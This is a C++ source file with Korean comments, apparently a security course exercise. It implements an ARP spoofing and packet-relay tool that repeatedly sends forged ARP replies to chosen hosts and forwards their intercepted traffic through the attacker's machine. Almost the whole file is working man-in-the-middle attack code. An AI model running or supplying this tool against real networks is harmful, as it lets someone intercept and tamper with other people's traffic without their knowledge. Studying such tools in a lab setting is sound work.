#include <cstdio>
#include <pcap.h>
#include <string>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include "ethhdr.h"
#include "arphdr.h"
#include <netinet/ip.h>  // IP 헤더 구조체를 사용하기 위해 필요

typedef std::string str;

#pragma pack(push, 1)
// Ethernet과 ARP 헤더를 포함하는 패킷 구조체 정의
struct EthArpPacket final {
    EthHdr eth_;  // Ethernet 헤더
    ArpHdr arp_;  // ARP 헤더
};
#pragma pack(pop)

// 사용법 안내 함수
void usage() {
    printf("syntax: send-arp-test <interface> <sender IP1> <target IP1> [<sender IP2> <target IP2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.0.1 192.168.0.142 192.168.0.142 192.168.0.1\n");
}

// 인터페이스의 MAC 주소를 가져오는 함수
str get_mac_address(const str& iface) {
    int fd;
    struct ifreq ifr;
    char mac_addr[18] = {0};

    // 소켓 생성
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    // MAC 주소 가져오기 (SIOCGIFHWADDR 명령어 사용)
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }

    close(fd);

    // MAC 주소를 문자열로 포맷팅
    sprintf(mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    return str(mac_addr);
}

// 인터페이스의 IP 주소를 가져오는 함수
str get_ip_address(const str& iface) {
    int fd;
    struct ifreq ifr;

    // 소켓 생성
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    // IP 주소 가져오기 (SIOCGIFADDR 명령어 사용)
    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        exit(EXIT_FAILURE);
    }

    close(fd);

    // IP 주소를 문자열로 반환
    return inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);
}

// ARP 패킷을 전송하는 함수
void send_arp_packet(pcap_t* handle, const Mac& src_mac, const Mac& dst_mac, const Ip& src_ip, const Ip& dst_ip, uint16_t op) {
    EthArpPacket packet;

    // Ethernet 헤더 설정
    packet.eth_.smac_ = src_mac;   // 송신자 MAC 주소
    packet.eth_.dmac_ = dst_mac;   // 수신자 MAC 주소
    packet.eth_.type_ = htons(EthHdr::Arp);  // Ethernet 타입을 ARP로 설정 (ntohs로 바이트 순서 변환)

    // ARP 헤더 설정
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);  // 하드웨어 타입: Ethernet
    packet.arp_.pro_ = htons(EthHdr::Ip4);    // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;  // 하드웨어 주소 길이
    packet.arp_.pln_ = Ip::SIZE;   // 프로토콜 주소 길이
    packet.arp_.op_ = htons(op);   // ARP 오퍼레이션 (Request 또는 Reply)

    packet.arp_.smac_ = src_mac;   // 송신자 MAC 주소
    packet.arp_.sip_ = htonl(src_ip);   // 송신자 IP 주소 (호스트 바이트 순서 -> 네트워크 바이트 순서로 변환)
    packet.arp_.tmac_ = dst_mac;   // 수신자 MAC 주소
    packet.arp_.tip_ = htonl(dst_ip);   // 수신자 IP 주소 (호스트 바이트 순서 -> 네트워크 바이트 순서로 변환)

    // 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Error sending ARP packet: %s\n", pcap_geterr(handle));
    }
}

// ARP 요청을 전송하고 응답을 수신하는 함수
EthArpPacket send_arp_request(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Ip& target_ip) {
    EthArpPacket request;

    // Ethernet 헤더 설정
    request.eth_.dmac_ = Mac::broadcastMac();  // 브로드캐스트 주소
    request.eth_.smac_ = my_mac;  // 송신자 MAC 주소
    request.eth_.type_ = htons(EthHdr::Arp);  // Ethernet 타입을 ARP로 설정

    // ARP 헤더 설정
    request.arp_.hrd_ = htons(ArpHdr::ETHER);  // 하드웨어 타입: Ethernet
    request.arp_.pro_ = htons(EthHdr::Ip4);    // 프로토콜 타입: IPv4
    request.arp_.hln_ = Mac::SIZE;  // 하드웨어 주소 길이
    request.arp_.pln_ = Ip::SIZE;   // 프로토콜 주소 길이
    request.arp_.op_ = htons(ArpHdr::Request);  // ARP 오퍼레이션: 요청

    request.arp_.smac_ = my_mac;   // 송신자 MAC 주소
    request.arp_.sip_ = htonl(my_ip);   // 송신자 IP 주소
    request.arp_.tmac_ = Mac("00:00:00:00:00:00");  // 대상 MAC 주소를 빈 값으로 설정
    request.arp_.tip_ = htonl(target_ip);   // 대상 IP 주소

    // ARP 요청 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Error sending ARP request: %s\n", pcap_geterr(handle));
    }

    struct pcap_pkthdr* header;
    const u_char* packet;
    EthArpPacket* capture;

    // 패킷 수신 대기
    while (true) {
        int ret = pcap_next_ex(handle, &header, &packet);  // 다음 패킷을 캡처
        if (ret == 1) {
            capture = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
            // 캡처한 패킷이 ARP 패킷이고, 오퍼레이션이 ARP Reply인지 확인
            if ((ntohs(capture->eth_.type_) == 0x0806) && (ntohs(capture->arp_.op_) == ArpHdr::Reply)) {
                return *capture;  // ARP Reply 패킷을 반환
            }
        }
    }
}

// ARP 스푸핑을 수행하는 함수
void arp_spoofing(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const std::vector<Ip>& sender_ips, const std::vector<Ip>& target_ips) {
    std::vector<Mac> sender_macs(sender_ips.size());  // 송신자 MAC 주소 목록
    std::vector<Mac> target_macs(target_ips.size());  // 대상 MAC 주소 목록

    // 각 송신자와 대상에 대해 ARP 요청을 보내고 MAC 주소를 얻음
    for (size_t i = 0; i < sender_ips.size(); ++i) {
        EthArpPacket sender_reply = send_arp_request(handle, my_mac, my_ip, sender_ips[i]);
        sender_macs[i] = sender_reply.eth_.smac_;  // 송신자의 MAC 주소를 저장

        EthArpPacket target_reply = send_arp_request(handle, my_mac, my_ip, target_ips[i]);
        target_macs[i] = target_reply.eth_.smac_;  // 대상의 MAC 주소를 저장
    }

    // ARP 스푸핑 패킷을 주기적으로 전송
    while (true) {
        for (size_t i = 0; i < sender_ips.size(); ++i) {
            // 송신자에게 스푸핑된 ARP Reply 전송 (공격자의 MAC 주소를 사용)
            send_arp_packet(handle, my_mac, sender_macs[i], target_ips[i], sender_ips[i], ArpHdr::Reply);
            // 대상에게 스푸핑된 ARP Reply 전송 (공격자의 MAC 주소를 사용)
            send_arp_packet(handle, my_mac, target_macs[i], sender_ips[i], target_ips[i], ArpHdr::Reply);
        }
        sleep(2);  // 2초 간격으로 전송
    }
}

// 패킷을 중계하는 함수
void relay_packets(pcap_t* handle, const std::vector<Ip>& sender_ips, const std::vector<Ip>& target_ips, const std::vector<Mac>& sender_macs, const std::vector<Mac>& target_macs, const Mac& my_mac) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;

        // 패킷 캡처
        int res = pcap_next_ex(handle, &header, &packet);  // 다음 패킷을 캡처
        if (res == 0) continue;  // 타임아웃 발생 시 계속
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("Error capturing packet: %s\n", pcap_geterr(handle));
            break;
        }

        EthHdr* eth_hdr = (EthHdr*)packet;  // Ethernet 헤더 포인터
        struct ip* ip_header = (struct ip*)(packet + sizeof(EthHdr)); // IP 헤더 포인터 (Ethernet 헤더 뒤에 위치)

        // 캡처한 패킷이 송신자나 대상으로부터 온 경우 중계
        for (size_t i = 0; i < sender_ips.size(); ++i) {
            // 송신자로부터 온 패킷인지 확인
            if (eth_hdr->smac_ == sender_macs[i] && eth_hdr->dmac_ == my_mac) {
                eth_hdr->smac_ = my_mac;  // 송신자 MAC 주소를 공격자의 MAC 주소로 변경
                eth_hdr->dmac_ = target_macs[i];  // 대상 MAC 주소로 설정
                pcap_sendpacket(handle, packet, header->caplen);  // 패킷 전송
            } 
            // 대상로부터 온 패킷인지 확인
            else if (eth_hdr->smac_ == target_macs[i] && eth_hdr->dmac_ == my_mac) {
                eth_hdr->smac_ = my_mac;  // 대상 MAC 주소를 공격자의 MAC 주소로 변경
                eth_hdr->dmac_ = sender_macs[i];  // 송신자 MAC 주소로 설정
                pcap_sendpacket(handle, packet, header->caplen);  // 패킷 전송
            }
        }
    }
}

// 메인 함수
int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();  // 사용법 안내
        return -1;
    }

    char* dev = argv[1];  // 네트워크 인터페이스 지정
    std::vector<Ip> sender_ips;  // 송신자 IP 목록
    std::vector<Ip> target_ips;  // 대상 IP 목록

    // 명령줄 인수에서 송신자와 대상 IP 주소를 추출
    for (int i = 2; i < argc; i += 2) {
        sender_ips.push_back(Ip(argv[i]));
        target_ips.push_back(Ip(argv[i + 1]));
    }

    // 자신의 MAC 및 IP 주소 가져오기
    str my_mac_str = get_mac_address(dev);
    str my_ip_str = get_ip_address(dev);

    Mac my_mac(my_mac_str.c_str());
    Ip my_ip(my_ip_str.c_str());

    // PCAP 세션 열기
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);  // 패킷 캡처 핸들러 열기
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // ARP 스푸핑과 패킷 중계를 각각의 스레드에서 수행
    std::thread spoofing_thread(arp_spoofing, handle, my_mac, my_ip, sender_ips, target_ips);
    std::thread relaying_thread([&handle, &sender_ips, &target_ips, &my_mac, &my_ip]() {
        std::vector<Mac> sender_macs(sender_ips.size());  // 송신자 MAC 주소 목록
        std::vector<Mac> target_macs(target_ips.size());  // 대상 MAC 주소 목록

        // ARP 요청을 통해 송신자 및 대상의 MAC 주소를 얻음
        for (size_t i = 0; i < sender_ips.size(); ++i) {
            EthArpPacket sender_reply = send_arp_request(handle, my_mac, my_ip, sender_ips[i]);
            sender_macs[i] = sender_reply.eth_.smac_;  // 송신자 MAC 주소 저장

            EthArpPacket target_reply = send_arp_request(handle, my_mac, my_ip, target_ips[i]);
            target_macs[i] = target_reply.eth_.smac_;  // 대상 MAC 주소 저장
        }

        // 패킷 중계 함수 실행
        relay_packets(handle, sender_ips, target_ips, sender_macs, target_macs, my_mac);
    });

    // 스레드 종료 대기
    spoofing_thread.join();
    relaying_thread.join();

    // PCAP 세션 종료
    pcap_close(handle);
    return 0;
}
